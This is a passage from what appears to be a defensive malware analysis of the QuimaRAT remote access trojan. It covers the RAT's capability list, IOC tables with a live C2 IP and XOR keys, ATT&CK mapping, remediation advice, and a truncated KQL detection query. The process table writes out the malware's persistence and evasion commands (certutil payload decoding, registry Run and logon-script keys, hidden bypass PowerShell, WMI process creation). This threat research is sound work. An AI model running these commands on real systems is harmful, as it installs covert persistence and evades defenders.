1. VM registry keys: VirtualBox Guest Additions key, VMware Tools key, `VBOx__` ACPI DSDT artifact
1. VM driver / directory files: `VBoxMouse.sys`, `VBoxGuest.sys`, `vmhgfs.sys`, `vmmouse.sys`, and the Guest Additions / VMware Tools install directories under `ProgramFiles`
1. Sandbox naming heuristics: `sandbox`, `malware`, `virus`, `sample`, `maltest`, `currentuser`, or computer names starting with `sandbox` or `malware`.

## C2 Dispatcher & Full RAT Capabilities

Up until this point, we've uncovered the ways the RAT presents itself to the victim filesystem: from the initial dropper to the JAR payload, persistence mechanisms, watchdog behavior, and cleanup. We've dug out a good number of IoCs and behavioral detection opportunities. It's time to identify what this RAT can actually do once it lands on the filesystem and - spoiler alert - it's pretty thorough. We begin by grepping the entire payload directory recursively for `channelRead0`, which is the signature method of `SimpleChannelInboundHandler`, Netty's (the underlying network IO toolset for this RAT) base class for the terminal handler that consumes messages. We see this implemented in the `src\org\ixk50z\rl6d\xfrzokkry.java` file which, upon inspection, delegates everything to a separate file, `src\org\ixk50z\rl6d\oqpfv.java` which handles the real C2 dispatching. From here, we pivot to the file `org\svcruntime\core\protocol\Packet.java` containing the packet/command structure, which lists a `PacketType` type as the command/opcode field. Finally, we land on the file `org\svcruntime\core\protocol\PacketType.java` to view the full functionality of this RAT. I hope you're sitting down for this next part.

Calling this sample piece of malware a RAT is, in retrospect, a horrible understatement. A better term would be **a full offensive framework with a baked in C2 protocol**. In total, `PacketType.java` contains 255 packet types spanning a whopping 14 categories. Below you will find some select examples of what QuimaRAT is capable of:

1. **Session management:** `HANDSHAKE`, `HEARTBEAT`, `DISCONNECT`, `RECONNECT`, `CLIENT_RESTART`, `CLIENT_UPDATE`
1. **File system:** `FILE_CHUNK_*`, `FILE_UPLOAD_CHUNK_*`, `FILE_RESUME_CHECK`, `FILE_ENCRYPT/DECRYPT` (ransomware-adjacent capability), `FILE_HIDE/SHOW`, `FILE_DEFENDER_EXCLUDE/REMOVE_EXCLUDE` (directly manipulate Windows Defender exclusions from the C2)
1. **Remote access:** `REMOTE_DESKTOP_*`, `HARDWARE_RDP_*`, `HVNC_*` (Hidden VNC session; operator gets a full invisible desktop with mouse, keyboard, clipboard and `HVNC_RUN` to launch apps in it), `RDP_TUNNEL_*`
1. **Shell/execution:** `CONSOLE_*`, `SCRIPT_RUN`, `DOWNLOAD_EXECUTE`, `SEND_FILE_EXECUTE`, `SEND_FILELESS_EXECUTE`
1. **Surveillance:** `KEYLOGGER_START/DATA/STOP/STATUS/FETCH`, `SCREENSHOT_REQUEST`, `SCREENSHOT_ALERT_*`, `SCREEN_RECORD_*`, `WEBCAM_*`, `MICROPHONE_*`, `AUDIO_RECORD_*`, `CLIPBOARD_GET/SET`
1. **Credential/data theft:** `LSASS_DUMP_REQUEST/RESP`, `BROWSER_RECOVERY_REQUEST/RESP`, `BROWSER_HISTORY_REQUEST/RESP`, `CLEAR_BROWSER_REQUEST`, `FTP_PASSWORD_RECOVERY`, `EMAIL_RECOVERY_REQUEST/RESP`, `APP_RECOVERY_REQUEST/RESP`, `COIN_WALLET_RECOVERY`, `EXT_STEAL_REQUEST/RESP`
1. **Injection/execution:** `DLL_INJECT_REQUEST/RESP`, `SHELLCODE_EXEC_REQUEST/RESP`, `PROC_HOLLOW_REQUEST/RESP`
1. **Defense Evasion:** `AMSI_BYPASS_REQUEST/RESP`, `ETW_PATCH_REQUEST/RESP`, `ROOTKIT_REQUEST/RESP`, `EVENT_LOG_CLEAR`
1. **Lateral Movement & AD:** `LATERAL_MOVE_REQUEST/RESP`, `AD_ENUM_REQUEST/RESP`, `NET_SHARE_REQUEST/RESP`, `NET_DISCOVERY_REQUEST/RESP`, `NETWORK_SCAN_START/RESULT/STOP`
1. **Network tunneling:** `SOCKS_*`, `RPROXY_*`, `PORT_FORWARD_*`
1. **Operator interaction & social engineering:** `CHAT_*`, `MESSAGE_BOX`, `TOAST_NOTIFY_REQUEST`, `PHISHING_REQUEST/RESP`, `BROWSER_HIJACK_REQUEST/RESP`, `HIDDEN_BROWSER_*`, `EDIT_HOSTS`, `FUN_ACTION` (pranks on the victim most likely, because why not)
1. **Financial crime:** `CRYPTO_CLIPPER_START/STOP/STATUS/LOG`
1. **Persistence Management:** `PERSISTENCE_INSTALL/REMOVE` (the four mechanisms we saw earlier), `PERSISTENCE_MGR_REQUEST/RESP/Action`
1. **Plugins:** `LOAD_PLUGIN/UNLOAD_PLUGIN/PLUGIN_LOADED_ACK/PLUGIN_LOAD_FAILED`

In fact, the opcode count in this file is so massive that the CFR decompiler itself inserted a comment highlighting the fact that this is one of the most complex enum files it's seen, stating _"Opcode count of 24254 triggered aggressive code reduction.  Override with --aggressivesizethreshold"_ (note here the CFR opcode count is a separate metric from the 255 unique packet types held within `PacketType.java`). QuimaRAT was not created to simply spy on a victim machine and allow the threat actor to perform a small handful of select functions. It was created as an all-encompassing attack framework, packaged into a RAT format to allow attackers to carry out their entire attack chain once the implant lands on a device. As a comparison example, the well-known AsyncRAT has a mere fraction of the number of packet types uncovered in this sample, with most estimates landing in the 30-40 range.

## Conclusion

This QuimaRAT sample serves to highlight the importance of threat intelligence in any formal and mature cybersecurity program. Malware takes many shapes and forms, and with the emergence of AI-assisted adversaries, defenders should expect to see attacker toolkits continue to expand at a rapid pace, as is evidenced by the sample analyzed in this article. This sample represents a sophisticated, multi-stage intrusion framework delivered via a self-extracting VBScript dropper and executed as a Java Archive payload. QuimaRAT is touted as a highly modular Java-based RAT able to be deployed on numerous systems, and this analysis shows just how true that claim is. QuimaRAT's feature set reflects deliberate design choices aimed at maximizing host compatibility, evading static detection, and ensuring operational persistence without requiring elevated privileges.

The initial dropper employs several well-documented yet effective living-off-the-land techniques: payload concealment as VBScript comment lines, base64 decoding via `certutil`, and a bring-your-own-JRE delivery from legitimate vendor CDNs to ensure execution on hosts without an existing Java runtime. The dropper self-terminates and removes its own artifacts upon successful handoff to the JAR, leaving minimal evidence of the initial delivery stage.

The payload is a mature, commercial-grade remote access tool built upon the `org.svcruntime` protocol framework, exposing **255 distinct packet types** across all major offensive capability categories. Its protocol design - including dual-channel SSL/WebSocket C2, TLS certificate pinning, optional DoH resolution - reflects intentional engineering against both network-level blocking and infrastructure takedown. The modular architecture means the static binary understates the tool's true capability ceiling; additional modules can be pushed over the wire at operator discretion without reinfection.

The XOR-encrypted configuration (`config.dat`) reveals that this deployment was configured conservatively relative to the tool's full capability set. Anti-VM evasion, scheduled task persistence, COM hijack persistence, and startup folder persistence were all present in the code but disabled. The active persistence mechanism - the somewhat unique `HKCU\Environment\UserInitMprLogonScript` registry key and the standard Run key (`WindowsPatch`) - is complemented by a VBScript watchdog (`sys_wd.vbs`) that monitors the RAT process and relaunches it if terminated, using a file-based kill switch (`.wd_stop`) to coordinate intentional shutdowns. 

The most significant capability findings for this environment are the presence of `LSASS_DUMP_REQUEST`, `ETW_PATCH_REQUEST`, and `AMSI_BYPASS_REQUEST` packet types, none of which require reinfection to activate. An operator with an established C2 session can silently disable AMSI, blind EDR telemetry by patching ETW providers, dump LSASS credentials, and pivot laterally via the built-in SOCKS proxy and port-forwarding channels — all from a persistent `javaw.exe` process that has no obvious reason to generate analyst attention. The `HVNC_*` packet family, providing a completely hidden parallel desktop session, and the `CRYPTO_CLIPPER_*` family, enabling real-time cryptocurrency address substitution, extend the threat model into both covert access and active financial crime.

**In summary:** This sample is a highly capable, well-engineered RAT with a 73-technique ATT&CK footprint, active C2 infrastructure, and confirmed persistence on any host where the dropper executed successfully.  Remediation requires removal of all established persistence mechanisms, termination of both the RAT process and watchdog process in the correct order (`.wd_stop` must be written before process termination to prevent watchdog-driven relaunch), and deletion of the full artifact set enumerated in the IOC table below. Given the tool's credential-harvesting and lateral movement capabilities, any host with a confirmed or suspected infection should be treated as fully compromised and assessed for downstream exposure prior to remediation.


---

## Indicators of Compromise (IOCs)


## Network IOCs

| Type | Indicator | Notes |
|---|---|---|
| C2 IP | `147.124.222.192` | Primary C2, both channels |
| C2 Port | `4445` | SSL transport |
| C2 Port | `443` | WebSocket transport |
| TLS Cert Hash | `f1c55b6ab06cce7d2adf5e3dcb544af3827c0dfdebde2c3ad702c1c5ca2c36ec` | Pinned C2 certificate — survives IP rotation |
| Plugin Base Hash | `32e0ac6473bfa854f777bdca6be1b2282ebaff7379ae256756cbb113b5525efa` | Plugin integrity verification hash |
| JRE Download URL | `https://api.adoptium.net/v3/binary/latest/17/ga/windows/x64/jre/hotspot/normal/eclipse` | BYO-JRE fallback #1 |
| JRE Download URL | `https://cdn.azul.com/zulu/bin/zulu17.54.21-ca-jre17.0.13-win_x64.zip` | BYO-JRE fallback #2 — version-pinned |
| JRE Download URL | `https://corretto.aws/downloads/latest/amazon-corretto-17-x64-windows-jre.zip` | BYO-JRE fallback #3 |

> **Detection note:** `wscript.exe` or `javaw.exe` making outbound connections to JRE vendor CDNs is highly anomalous. The Azul URL is version-pinned and uniquely identifying for this builder. The cert hash `f1c55b6a...` is the strongest durable network IOC — it fingerprints the C2 independently of IP.

---

## Filesystem IOCs

### Dropper / Staging Layer

| Path | Notes |
|---|---|
| `%LOCALAPPDATA%\.ssadocument\` | VBS dropper JRE staging directory — hidden dotfolder |
| `%LOCALAPPDATA%\.ssadocument\jre\` | Bundled portable JRE (private, not system-wide) |
| `%LOCALAPPDATA%\.ssadocument\jre_download.zip` | JRE download artifact (deleted post-install) |
| `%LOCALAPPDATA%\.ssadocument\jre_extract\` | JRE unzip staging (deleted post-install) |
| `%TEMP%\~<random>\` | Temporary staging directory created by dropper |
| `%TEMP%\~<random>\r.jar` | Initial JAR payload drop (temp, may be deleted) |
| `%TEMP%\<random>` | `tmpB64` — certutil input (auto-deleted) |
| `%TEMP%\<random>` | `tmpBin` — certutil output (auto-deleted) |
| `%TEMP%\<random>.js` | JScript XOR helper (auto-deleted, if XOR path used) |

### RAT Install Layer

| Path | Notes |
|---|---|
| `%LOCALAPPDATA%\.windowspatch\jre\bin\javaw.exe` | JAR's expected JRE path — derived from `regName` config value. Note that the value in config overrides the path hardcoded in the VBScript dropper. Hunt both. |
| `%APPDATA%\SlackData\` | RAT install folder (`FOLDER` from config) |
| `%APPDATA%\SlackData\ssa_document.lib` | Installed RAT JAR (`FILE_NAME` from config — `.lib` extension masquerade) |
| `%APPDATA%\SlackData\.cache\` | Runtime working data / cache |
| `%APPDATA%\SlackData\.hwid` | Hardware fingerprint file — victim tracking ID |
| `%APPDATA%\.cache\plugins\` | Plugin module storage |
| `%LOCALAPPDATA%\Microsoft\Windows\Caches\plg\` | Secondary plugin cache — hidden in legitimate Windows directory |
| `%APPDATA%\QuimaLogs\` | Offline exfiltration queue (store-and-forward when C2 unreachable) |
| `%APPDATA%\QuimaLogs\.offline_enabled` | Offline mode sentinel file |

### Watchdog Layer

| Path | Notes |
|---|---|
| `%APPDATA%\Microsoft\Windows\Templates\sys_wd.vbs` | Watchdog VBS — monitors and relaunches RAT process; named `sys_wd.vbs` |
| `%APPDATA%\Microsoft\Windows\Templates\.wd_stop` | Watchdog kill-switch file — presence signals intentional shutdown |

### Startup Persistence

| Path | Notes |
|---|---|
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPatch.bat` | Startup folder `.bat` persistence |
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsPatch.lnk` | Startup folder `.lnk` persistence (separate variant) |

> **Detection note:** The install folder name (`SlackData`) and file name (`ssa_document.lib`) are config-driven via `folder`/`fileName` fields and will vary across builds. Hunt on the **pattern** (`%APPDATA%\<name>\<file>.lib` launched by `javaw`) rather than literal strings alone. `QuimaLogs` and `.hwid` are more stable builder-level artifacts.

---

## Registry IOCs

| Hive / Key | Value Name | Data | Notes |
|---|---|---|---|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `WindowsPatch` | `"<java>" -Xmx128m -jar "<jar>"` | Standard Run key persistence — T1547.001 |
| `HKCU\Environment` | `UserInitMprLogonScript` | `wscript.exe //B //Nologo "<sys_wd.vbs>"` | Logon script persistence — T1037.001; quieter than Run key |

> **Detection note:** Any `UserInitMprLogonScript` value referencing a `.jar`, `javaw`, or `.vbs` is high-confidence malicious. Legitimate use of this key is rare. Sysmon Event ID 13 (RegistryValueSet) targeting `HKCU\Environment\UserInitMprLogonScript` is a clean hunt.

---

## Scheduled Task IOCs

| Field | Value | Notes |
|---|---|---|
| Task Name | `WindowsPatch` | Config-driven via `regName` |
| Trigger | At logon — current user | `New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME` |
| Action | `"<java>" -Xmx128m -jar "<jar>"` | Runs hidden, no execution time limit |
| Settings | `-AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0` | Fires on laptops regardless of power state |
| Creation method | `powershell.exe Register-ScheduledTask` | Created via cmdlet, not `schtasks.exe` |

---

## Process / Behavioral IOCs

| Parent | Child / Command | Notes |
|---|---|---|
| `wscript.exe` | `certutil -f -decode <tmpB64> <tmpBin>` | Dropper payload extraction — LOLBin abuse |
| `wscript.exe` | `javaw.exe -Xmx256m -jar r.jar` | Initial RAT launch from dropper |
| `javaw.exe` | `cmd.exe /c reg add HKCU\...\Run /v WindowsPatch ...` | Run key persistence install |
| `javaw.exe` | `cmd.exe /c reg add HKCU\Environment /v UserInitMprLogonScript ...` | Logon script persistence install |
| `javaw.exe` | `powershell.exe -nop -ep bypass -w hidden -EncodedCommand <b64>` | Watchdog kill + Register-ScheduledTask |
| `javaw.exe` | `cmd.exe /c wmic process where "Name='wscript.exe' AND CommandLine LIKE '%sys_wd.vbs%'" call terminate` | Launcher cleanup |
| `javaw.exe` | `taskkill /F /IM wscript.exe /FI "COMMANDLINE LIKE %%sys_wd.vbs%%"` | Launcher cleanup (fallback) |
| `javaw.exe` | `powershell.exe ... Invoke-WmiMethod -Class Win32_Process -Name Create ...` | Watchdog relaunch via WMI |
| `javaw.exe` | `cmd.exe /c tasklist` | Anti-VM process enumeration |
| `javaw.exe` | `cmd.exe /c reg query "HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions"` | Anti-VM registry check |
| `javaw.exe` | `cmd.exe /c reg query "HKLM\SOFTWARE\VMware, Inc.\VMware Tools"` | Anti-VM registry check |
| `javaw.exe` | `cmd.exe /c tasklist /NH \| find /c /v ""` | Anti-VM process count check |
| `javaw.exe` | `cmd.exe /c reg delete HKCU\...\Run /v WindowsPatch /f` | Uninstall / self-removal |
| `javaw.exe` | `schtasks /delete /tn WindowsPatch /f` | Scheduled task removal |
| `javaw.exe` | `javaw.exe -Xmx128m -jar ssa_document.lib` | Persistent launch (post-install) |

> **Detection note:** `javaw.exe` as a parent of `cmd.exe`, `powershell.exe`, `reg.exe`, `schtasks.exe`, or `wmic.exe` is the highest-confidence behavioral signature. Java applications have no legitimate reason to install registry persistence, kill WScript processes, or invoke WMI process creation.

---

## Cryptographic IOCs

| Type | Value | Notes |
|---|---|---|
| XOR config key | `C5 E2 7F 18 16 0E 1E 1D 53 FD` | 10-byte repeating key; decrypts `config.dat` → JSON |
| Java string XOR key | `0x37` (55 decimal) | Fixed key for `a(int...)` varargs string obfuscator throughout JAR |
| C2 TLS cert hash | `f1c55b6ab06cce7d2adf5e3dcb544af3827c0dfdebde2c3ad702c1c5ca2c36ec` | Pinned in config — network IOC independent of IP |
| Plugin base hash | `32e0ac6473bfa854f777bdca6be1b2282ebaff7379ae256756cbb113b5525efa` | Plugin integrity verification |

---

## Configuration IOCs

| Field | Value | Notes |
|---|---|---|
| `targetOs` | `windows` | OS gate |
| `hosts[0].ip` | `147.124.222.192` | Primary C2 |
| `hosts[0].port` | `4445` | SSL channel |
| `hosts[0].transport` | `SSL` | |
| `hosts[1].ip` | `147.124.222.192` | Same IP, second channel |
| `hosts[1].port` | `443` | WebSocket channel — blends with HTTPS |
| `hosts[1].transport` | `WEBSOCKET` | |
| `serverId` | `CLIENT` | Campaign/group tag — default/unconfigured value |
| `delay` | `2` | Reconnect delay (seconds) |
| `fileName` | `ssa_document.lib` | Installed JAR filename |
| `folder` | `SlackData` | Install folder name |
| `regName` | `WindowsPatch` | Persistence value/task/file name |
| `certHash` | `f1c55b6ab06cce7d2adf5e3dcb544af3827c0dfdebde2c3ad702c1c5ca2c36ec` | Pinned TLS cert |
| `pluginBaseHash` | `32e0ac6473bfa854f777bdca6be1b2282ebaff7379ae256756cbb113b5525efa` | Plugin hash |
| `installReg` | `true` | Run key + logon script persistence active |
| `installPersist` | `true` | Master persistence gate — active |
| `enableWatchdog` | `true` | Watchdog active |
| `antiVm` | `false` | VM evasion disabled this deployment |
| `installSch` | `false` | Scheduled task disabled this deployment |
| `installStart` | `false` | Startup folder disabled this deployment |
| `installComHijack` | `false` | COM hijack disabled this deployment |

---

## Build / Attribution IOCs

| Type | Value | Notes |
|---|---|---|
| JAR Main-Class | `org.ixk50z.rl6d.tkn.wradk` | Obfuscated entry point |
| Protocol package | `org.svcruntime.core.protocol` | **Unobfuscated** — primary family attribution string |
| Offline log dir | `QuimaLogs` | Distinctive builder-level string — pivot for family identification |
| Build-Id | `ed447756-af45-4496-945e-437f4c6b0c91` | Per-build UUID from JAR manifest |
| Build-Timestamp | `1783565120950` | Epoch milliseconds — 2026 build date |
| X-Seed | `924e8JGMJOR475CjKBfJ4iz` | Builder obfuscation seed — appears in manifest |
| manifestCreatedBy | `oB7s5ZKVe1rIWrHiktxoDiQ0brggRT53RTWG` | Builder watermark — present in manifest and config |
| manifestComment | `59TJfdPtuM5k6RLrekXyHh4JW3VmSPssg3QwtseG` | Builder watermark — present in manifest and config |
| Payload marker | `'__PAYLOAD__` | VBS self-extraction sentinel line |
| Dropper filename | `sys_wd.vbs` | On-disk name of VBS launcher (from JAR cleanup code) |

> **Attribution note:** `org.svcruntime`, `QuimaLogs`, and the dual-manifest/config watermark pattern are the strongest leads for family identification. Search threat intel sources for these strings, particularly `QuimaLogs` (unique and unlikely to appear in legitimate software) and `org.svcruntime.core.protocol` (unobfuscated framework namespace). `serverId: "CLIENT"` suggests an unconfigured or default builder deployment.

---

## IOC Summary Counts

| Category | Count |
|---|---|
| Network (IPs / Ports / URLs / Hashes) | 11 |
| Filesystem paths | 20 |
| Registry keys/values | 2 |
| Scheduled tasks | 1 |
| Behavioral (process chains) | 14 |
| Cryptographic | 4 |
| Configuration fields | 20 |
| Build / Attribution | 8 |
| **Total** | **80** |


## MITRE ATT&CK Mapping

> **255 PacketTypes enumerated.** Status: **Active** = observed/config-enabled in this deployment. **Capability** = present in binary or protocol but config-disabled or packet-type only. *(Dropper)* = VBS delivery layer.

| Tactic | ID | Technique / Sub-technique | Evidence / Notes | Status |
|---|---|---|---|---|
| **Initial Access** | T1566 | Phishing | Inferred delivery vector for VBS dropper | Active |
| **Execution** | T1059.005 | Command & Scripting: Visual Basic | `sys_wd.vbs` dropper; payload self-extraction | Active *(Dropper)* |
| **Execution** | T1059.001 | Command & Scripting: PowerShell | Persistence install; watchdog kill (`-EncodedCommand -ep bypass -w hidden`) | Active |
| **Execution** | T1059.003 | Command & Scripting: Windows Command Shell | `cmd.exe /c` throughout dropper and JAR persistence/cleanup routines | Active |
| **Execution** | T1047 | Windows Management Instrumentation | `Invoke-WmiMethod Win32_Process.Create` for watchdog launch; `wmic process ... call terminate` | Active |
| **Execution** | T1105 | Ingress Tool Transfer | BYO-JRE download from Adoptium/Azul/Corretto if Java not present | Active *(Dropper)* |
| **Execution** | T1218 | System Binary Proxy Execution: Certutil | `certutil -f -decode` for base64 payload extraction | Active *(Dropper)* |
| **Execution** | T1055.001 | Process Injection: DLL Injection | `DLL_INJECT_REQUEST/RESP` | Capability |
| **Execution** | T1055.012 | Process Injection: Process Hollowing | `PROC_HOLLOW_REQUEST/RESP` | Capability |
| **Execution** | T1055 | Process Injection: Shellcode | `SHELLCODE_EXEC_REQUEST/RESP` | Capability |
| **Persistence** | T1547.001 | Boot/Logon Autostart: Registry Run Keys / Startup Folder | Run key `HKCU\...\Run\WindowsPatch`; `WindowsPatch.bat` in Startup folder | Active (`installReg:true`) |
| **Persistence** | T1037.001 | Boot/Logon Init Scripts: Logon Script (Windows) | `HKCU\Environment\UserInitMprLogonScript` → `javaw -Xmx128m -jar` | Active (`installReg:true`) |
| **Persistence** | T1053.005 | Scheduled Task/Job: Scheduled Task | `Register-ScheduledTask WindowsPatch`; at-logon, no time limit | Capability (`installSch:false`) |
| **Persistence** | T1546.015 | Event Triggered Execution: COM Hijacking | `INSTALL_COM_HIJACK` code path present in `wickrrkm` | Capability (`installComHijack:false`) |
| **Privilege Escalation** | T1548.002 | Abuse Elevation Control: Bypass UAC | `UAC_SPOOF_REQUEST/RESP` | Capability |
| **Privilege Escalation** | T1134.001 | Access Token Manipulation: Token Impersonation/Theft | `TOKEN_IMPERSONATE`, `TOKEN_STEAL_REQUEST/RESP`, `TOKEN_ENUM_REQUEST` | Capability |
| **Defense Evasion** | T1027 | Obfuscated Files or Information | Multi-layer: base64 payload in VBS comment lines; XOR-encrypted `config.dat`; Java string arithmetic `(char)(A-B)` + `a(int...)` XOR-varargs obfuscation | Active |
| **Defense Evasion** | T1140 | Deobfuscate/Decode Files or Information | Runtime XOR config decrypt (10-byte key `C5E27F18160E1E1D53FD`); `certutil` base64 decode | Active |
| **Defense Evasion** | T1036 | Masquerading | `WindowsPatch` (Run key/task name); `SlackData` install folder; `ssa_document.lib` (JAR with `.lib` extension); Startup `.lnk` | Active |
| **Defense Evasion** | T1564.001 | Hide Artifacts: Hidden Files and Directories | `.ssadocument`, `.windowspatch`, `.wd_stop`, `.hwid` dotfiles/dotfolders; plugin cache under `%LOCALAPPDATA%\Microsoft\Windows\Caches\plg` | Active |
| **Defense Evasion** | T1497.001 | Virtualization/Sandbox Evasion: System Checks | 6-layer `j()`: VM guest-tool processes, VM registry keys, VM driver files, sandbox usernames/hostnames, screen resolution ≤640×480, process count <15 | Capability (`antiVm:false`) |
| **Defense Evasion** | T1562.001 | Impair Defenses: Disable or Modify Tools | `AMSI_BYPASS_REQUEST/RESP`; `FILE_DEFENDER_EXCLUDE/REMOVE_EXCLUDE` | Capability |
| **Defense Evasion** | T1562.006 | Impair Defenses: Disable or Modify ETW | `ETW_PATCH_REQUEST/RESP` — patches ETW providers in-memory, blinds EDR telemetry | Capability |
| **Defense Evasion** | T1014 | Rootkit | `ROOTKIT_REQUEST/RESP` | Capability |
| **Defense Evasion** | T1070.001 | Indicator Removal: Clear Windows Event Logs | `EVENT_LOG_CLEAR` | Capability |
| **Defense Evasion** | T1070.004 | Indicator Removal: File Deletion | Full artifact cleanup in `e()`; dropper temp file deletion (`tmpB64`, `tmpBin`, `jf` JScript temp) | Active |
| **Defense Evasion** | T1070.009 | Indicator Removal: Clear Persistence | `e()` removes all four persistence mechanisms; deletes `sys_wd.vbs`, `.wd_stop` | Capability |
| **Defense Evasion** | T1620 | Reflective Code Loading | `SEND_FILELESS_EXECUTE` — in-memory execution, no disk write | Capability |
| **Discovery** | T1082 | System Information Discovery | `SYSTEM_INFO_REQUEST`, `ENV_VARS_REQUEST` | Capability |
| **Discovery** | T1083 | File and Directory Discovery | `FILE_LIST`, `FILE_DRIVES`, `FILE_SEARCH_*` | Capability |
| **Discovery** | T1057 | Process Discovery | `PROCESS_LIST`; anti-VM `tasklist` enumeration in `j()` | Active / Capability |
| **Discovery** | T1012 | Query Registry | `REGISTRY_QUERY`; anti-VM `reg query` for VM keys in `j()` | Active / Capability |
| **Discovery** | T1007 | System Service Discovery | `SERVICE_LIST` | Capability |
| **Discovery** | T1010 | Application Window Discovery | `ACTIVE_WINDOW_LIST` | Capability |
| **Discovery** | T1518 | Software Discovery | `SOFTWARE_LIST` | Capability |
| **Discovery** | T1518.001 | Software Discovery: Security Software Discovery | Anti-VM analysis-tool enumeration in `j()`: Wireshark, x64dbg, Process Hacker, IDA Pro, ProcMon, etc. | Capability (`antiVm:false`) |
| **Discovery** | T1046 | Network Service Scanning | `NETWORK_SCAN_START/RESULT/STOP` — scans from victim host | Capability |
| **Discovery** | T1018 | Remote System Discovery | `NET_DISCOVERY_REQUEST/RESP` | Capability |
| **Discovery** | T1135 | Network Share Discovery | `NET_SHARE_REQUEST/RESP` | Capability |
| **Discovery** | T1482 | Domain Trust Discovery | `AD_ENUM_REQUEST/RESP` — Active Directory enumeration | Capability |
| **Discovery** | T1016 | System Network Configuration Discovery | `CONNECTIONS_LIST`, `WIRELESS_LIST` | Capability |
| **Discovery** | T1049 | System Network Connections Discovery | `CONNECTIONS_LIST` — active TCP/UDP connections | Capability |
| **Discovery** | T1614 | System Location Discovery | `LOCATION_REQUEST/RESP` | Capability |
| **Discovery** | T1033 | System Owner/User Discovery | Username/hostname checks in `j()`; included in `HANDSHAKE` check-in data | Active |
| **Lateral Movement** | T1021.001 | Remote Services: RDP | `RDP_TUNNEL_*`, `HARDWARE_RDP_*`, `RDP_ACTION_REQUEST` | Capability |
| **Lateral Movement** | T1021 | Remote Services: Lateral Movement | `LATERAL_MOVE_REQUEST/RESP` | Capability |
| **Lateral Movement** | T1570 | Lateral Tool Transfer | `SEND_FILE_EXECUTE`, `DOWNLOAD_EXECUTE` from victim host | Capability |
| **Collection** | T1056.001 | Input Capture: Keylogging | `KEYLOGGER_START/DATA/STOP/STATUS/FETCH` — persistent, with offline store | Capability |
| **Collection** | T1056.002 | Input Capture: GUI Input Capture | `CLIPBOARD_LOG_START/DATA/STOP` — persistent clipboard interception | Capability |
| **Collection** | T1113 | Screen Capture | `SCREENSHOT_REQUEST/RESP`, `SCREEN_RECORD_*`, `SCREENSHOT_ALERT_*` (activity-triggered) | Capability |
| **Collection** | T1123 | Audio Capture | `MICROPHONE_*`, `AUDIO_RECORD_*`, `REVERSE_MICROPHONE_*` — three independent mechanisms | Capability |
| **Collection** | T1125 | Video Capture | `WEBCAM_START/FRAME/STOP` | Capability |
| **Collection** | T1115 | Clipboard Data | `CLIPBOARD_GET/SET`, `CLIPBOARD_LOG_*`, `CRYPTO_CLIPPER_*` | Capability |
| **Collection** | T1074 | Data Staged | `QuimaLogs\` offline queue with `.offline_enabled` sentinel for store-and-forward exfil | Active |
| **Collection** | T1005 | Data from Local System | Full filesystem access via file manager commands | Capability |
| **Collection** | T1185 | Browser Session Hijacking | `BROWSER_HIJACK_REQUEST`, `HIDDEN_BROWSER_*` (invisible browser session) | Capability |
| **Credential Access** | T1003.001 | OS Credential Dumping: LSASS Memory | `LSASS_DUMP_REQUEST/RESP` — highest severity finding | Capability |
| **Credential Access** | T1555.003 | Credentials from Password Stores: Web Browsers | `BROWSER_RECOVERY_REQUEST/RESP`, `CHROME_FORM_GRABBER` | Capability |
| **Credential Access** | T1555 | Credentials from Password Stores | `PASSMGR_DUMP_REQUEST`, `APP_RECOVERY_REQUEST`, `FTP_PASSWORD_RECOVERY`, `EMAIL_RECOVERY_REQUEST` | Capability |
| **Credential Access** | T1539 | Steal Web Session Cookie | `BROWSER_RECOVERY`, `EXT_STEAL_REQUEST` (browser extension session tokens) | Capability |
| **Credential Access** | T1528 | Steal Application Access Token | `EXT_STEAL_REQUEST/RESP` — browser extensions including 2FA apps and crypto wallets | Capability |
| **Credential Access** | T1552 | Unsecured Credentials | `VPN_EXTRACT_REQUEST/RESP`, `RDP_CRED_REQUEST/RESP` | Capability |
| **Credential Access** | T1134.001 | Access Token Manipulation: Token Impersonation | `TOKEN_IMPERSONATE`, `TOKEN_STEAL_REQUEST/RESP` | Capability |
| **Command & Control** | T1071.001 | Application Layer Protocol: Web Protocols | WebSocket C2 on port 443 | Active |
| **Command & Control** | T1573 | Encrypted Channel | Dual-channel: SSL (port 4445) + WebSocket TLS (port 443); cert pinning via `certHash` `f1c55b6a...` | Active |
| **Command & Control** | T1571 | Non-Standard Port | SSL C2 on port 4445 | Active |
| **Command & Control** | T1008 | Fallback Channels | Dual SSL+WebSocket; `pastebinUrl` dead-drop fallback; `dohDomain` DoH resolution | Capability (disabled this config) |
| **Command & Control** | T1102.001 | Web Service: Dead Drop Resolver | `PASTEBIN_URL` for live C2 IP resolution — survives static IP blocking | Capability (disabled) |
| **Command & Control** | T1568 | Dynamic Resolution | `DOH_DOMAIN` DNS-over-HTTPS for C2 hostname resolution — evades DNS monitoring | Capability (disabled) |
| **Command & Control** | T1090.003 | Proxy: Multi-hop Proxy | `SOCKS_*`, `RPROXY_*` — victim as network pivot | Capability |
| **Command & Control** | T1572 | Protocol Tunneling | `PORT_FORWARD_*`, `RDP_TUNNEL_*` | Capability |
| **Impact** | T1657 | Financial Theft | `CRYPTO_CLIPPER_START/STOP/STATUS/LOG` — replaces cryptocurrency addresses in clipboard | Capability |
| **Impact** | T1486 | Data Encrypted for Impact | `FILE_ENCRYPT/DECRYPT` — ransomware-adjacent file encryption | Capability |
| **Impact** | T1529 | System Shutdown/Reboot | `SYSTEM_POWER`, `POWER_ACTION` | Capability |
| **Impact** | T1565.001 | Data Manipulation: Stored Data Manipulation | `EDIT_HOSTS` — modifies `hosts` file for DNS hijacking | Capability |
| **Impact** | T1489 | Service Stop | `SERVICE_ACTION` | Capability |

---

## Summary Counts

| Tactic | Techniques Mapped |
|---|---|
| Initial Access | 1 |
| Execution | 8 |
| Persistence | 4 |
| Privilege Escalation | 2 |
| Defense Evasion | 12 |
| Discovery | 14 |
| Lateral Movement | 3 |
| Collection | 9 |
| Credential Access | 7 |
| Command & Control | 8 |
| Impact | 5 |
| **Total** | **73** |

---

## Detection Query

Below is a sample KQL query that covers the entire attack chain, from initial dropper detection to payload execution. As always, test new detection rules in your environment prior to operationalizing them, making sure to identify baseline behavior and tune it out accordingly.

```kql
let DropperIndicators =
    DeviceFileEvents
    | where FolderPath contains ".ssadocument"
    or FolderPath contains "jre_download.zip"
    or FolderPath contains "jre_extract"
